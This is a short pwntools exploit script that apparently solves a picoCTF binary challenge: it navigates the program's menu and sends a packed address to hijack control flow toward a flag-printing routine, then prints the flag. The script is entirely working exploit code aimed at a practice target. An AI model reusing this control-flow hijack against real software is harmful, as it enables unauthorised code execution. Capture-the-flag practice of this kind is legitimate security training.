#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 6312)

    return r


def main():
    r = conn()

    r.sendlineafter('(e)xit\n', 'I')
    r.sendlineafter('?\n', 'Y')
    r.sendlineafter('(e)xit\n', 'l')
    r.sendlineafter('try anyways:\n', p64(0x80487d6))
    
    flag = r.recvlineS()
    print(flag)


if __name__ == "__main__":
    main()
